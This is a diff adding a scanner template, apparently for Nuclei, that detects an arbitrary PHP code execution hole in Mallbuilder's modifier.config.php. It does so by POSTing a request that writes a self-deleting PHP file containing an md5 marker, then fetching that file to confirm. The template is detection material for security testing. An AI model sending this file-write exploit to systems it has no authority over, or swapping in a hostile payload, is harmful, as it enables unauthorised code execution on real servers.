@@ -1,0 +1,36 @@
+id: poc-yaml-mallbuilder-file-write-backdoor
+info:
+  name: Mallbuilder modifier.config.php 任意PHP代码执行漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+
+variables:
+  r_filename: "{{rand_text_alphanumeric(8)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: file-write
+    method: POST
+    path:
+      - "{{BaseURL}}/lib/smarty/plugins/modifier.config.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      codelock_filed=.&codelock_mastersize=3&codelock_act=3&codelock_enc={{r_filename}}.php&codelock_masterdata=<?php echo md5(1e10);unlink(__FILE__);?>
+    matchers:
+      - type: status
+        status:
+          - 404
+
+  - id: file-check
+    method: GET
+    path:
+      - "{{BaseURL}}/lib/smarty/plugins/{{r_filename}}.php"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "81f7d977c49aaa00fb2cd0d35fed6a9a"
